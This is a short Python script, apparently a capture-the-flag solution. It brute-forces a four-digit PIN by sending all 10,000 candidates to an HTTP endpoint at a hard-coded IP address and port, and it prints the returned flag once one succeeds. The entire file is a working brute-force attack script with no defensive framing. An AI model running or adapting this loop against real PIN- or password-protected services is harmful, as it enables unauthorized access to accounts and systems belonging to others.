import requests

ip = "154.57.164.66"
port = 31379

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    print(f"Attempted PIN: {formatted_pin}")

    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break